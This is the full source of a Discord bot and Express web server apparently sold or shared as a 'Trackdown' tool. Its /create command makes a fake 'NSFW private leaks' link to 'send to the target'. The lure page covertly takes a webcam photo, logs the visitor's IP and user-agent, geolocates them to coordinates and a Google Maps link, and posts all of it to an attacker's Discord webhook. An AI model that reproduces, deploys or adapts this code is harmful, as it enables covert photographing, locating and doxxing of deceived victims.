const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// ================== ENV VARIABLES ==================
const TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const DOMAIN = process.env.DOMAIN;

if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
  console.error("❌ Missing environment variables!");
}

app.set('trust proxy', true);
app.use(express.json());

// Health Check
app.get('/', (req, res) => {
  res.send('✅ Trackdown bot is running!');
});

const trackingLinks = new Map();

// ================== FAKE NSFW PAGE ==================
app.get('/track/:id', (req, res) => {
  const trackId = req.params.id;
  const originalUrl = trackingLinks.get(trackId);

  if (!originalUrl) {
    return res.send('<h1 style="color:red">Link expired or invalid</h1>');
  }

  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Discord • Private Leaks</title>
  <style>
    body { background:#0f0f0f; color:#ff00aa; font-family:Arial; text-align:center; margin:0; padding:40px 20px; }
    h1 { font-size:28px; margin:20px 0; }
    .progress { height:10px; background:#222; border-radius:5px; overflow:hidden; margin:30px auto; max-width:400px; }
    .bar { height:100%; width:0%; background:linear-gradient(90deg,#ff00aa,#00ffff); animation:load 4.5s linear forwards; }
    .status { color:#00ff88; font-size:18px; margin:15px 0; }
    @keyframes load { to { width:100%; } }
  </style>
</head>
<body>
  <h1>🔞 DISCORD NSFW PRIVATE LEAKS</h1>
  <p>Decrypting 18+ content from leaked server...</p>
  <div class="progress"><div class="bar"></div></div>
  <p class="status" id="status">69% • Please wait...</p>

  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream = null;

    async function logVisit(photo = null, cameraStatus = "Denied/Failed") {
      fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          trackId: "${trackId}",
          ip: "${ip}",
          userAgent: "${userAgent.replace(/"/g, '\\"')}",
          photo: photo,
          cameraAccess: photo ? "Granted" : cameraStatus
        })
      }).catch(() => {});
    }

    async function start() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.onloadedmetadata = () => setTimeout(takePhoto, 2600);
      } catch(e) {
        document.getElementById('status').textContent = "Access denied • Redirecting...";
        await logVisit(null, "Denied");
        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1500);
      }
    }

    function takePhoto() {
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photo = canvas.toDataURL('image/jpeg', 0.82);

      logVisit(photo, "Granted").then(() => {
        if (stream) stream.getTracks().forEach(t => t.stop());
        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1000);
      });
    }

    start();
  </script>
</body>
</html>`;

  res.send(html);
});

// ================== LOG ENDPOINT WITH BETTER LOCATION ==================
app.post('/log', async (req, res) => {
  const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
  const originalUrl = trackingLinks.get(trackId) || 'Unknown';

  let city = 'Unknown', region = '', country = '', lat = '', lon = '', isp = 'Unknown';

  try {
    if (ip && ip !== 'Unknown') {
      // Using ip-api.com (free, no key, returns lat/lon)
      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,timezone`, { timeout: 6000 });
      
      if (geo.data.status === "success") {
        city = geo.data.city || 'Unknown';
        region = geo.data.regionName || '';
        country = geo.data.country || '';
        lat = geo.data.lat || '';
        lon = geo.data.lon || '';
        isp = geo.data.isp || 'Unknown';
      }
    }
  } catch (e) {
    console.error("Geo API error:", e.message);
  }

  const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
  const coords = lat && lon ? `(${lat}, ${lon})` : '';
  const mapsLink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : '#';

  const embed = {
    title: "🎯 Trackdown Hit - NSFW Fake Link",
    color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
    fields: [
      { name: "IP", value: `\`${ip}\``, inline: true },
      { name: "Location", value: `${locationText} ${coords}`, inline: true },
      { name: "Camera", value: cameraAccess, inline: true },
      { name: "ISP", value: isp, inline: false },
      { name: "Google Maps", value: mapsLink !== '#' ? `[📍 View on Maps](${mapsLink})` : "Not available", inline: false },
      { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
      { name: "User-Agent", value: (userAgent || "Unknown").substring(0, 300), inline: false },
      { name: "Original URL", value: originalUrl, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    if (photo && photo.startsWith('data:image')) {
      const form = new FormData();
      form.append('payload_json', JSON.stringify({ embeds: [embed] }));
      const base64Data = photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      form.append('file', buffer, 'captured.jpg');
      await axios.post(WEBHOOK_URL, form, { headers: form.getHeaders() });
    } else {
      await axios.post(WEBHOOK_URL, { embeds: [embed] });
    }
  } catch (err) {
    console.error("Webhook error:", err.message);
  }

  res.sendStatus(200);
});

// ================== DISCORD BOT ==================
client.once('ready', () => {
  console.log(`✅ Bot is online → ${client.user.tag}`);
});

const cmd = new SlashCommandBuilder()
  .setName('create')
  .setDescription('Create fake NSFW leaks tracking link')
  .addStringOption(opt =>
    opt.setName('url')
      .setDescription('Real URL to redirect after tracking')
      .setRequired(true));

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;

  const url = interaction.options.getString('url');
  if (!url.startsWith('http')) {
    return interaction.reply({ content: '❌ URL must start with http:// or https://', ephemeral: true });
  }

  const trackId = 'nsfw_' + Date.now().toString(36);
  trackingLinks.set(trackId, url);

  const link = `${DOMAIN}/track/${trackId}`;

  await interaction.reply({
    content: `**✅ Fake NSFW Tracking Link Created!**\n\n` +
             `**Tracking Link:** ${link}\n` +
             `**Redirects to:** ${url}\n\n` +
             `Send this to the target.`,
    ephemeral: true
  });
});

// ================== START SERVER & BOT ==================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`✅ Web server running on port ${PORT}`);
});

client.login(TOKEN)
  .then(() => console.log("✅ Discord bot logged in"))
  .catch(err => {
    console.error("❌ Discord login failed:", err.message);
    console.log("⚠️ Web server is still running.");
  });

process.on('unhandledRejection', (reason) => console.error('Unhandled Rejection:', reason));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
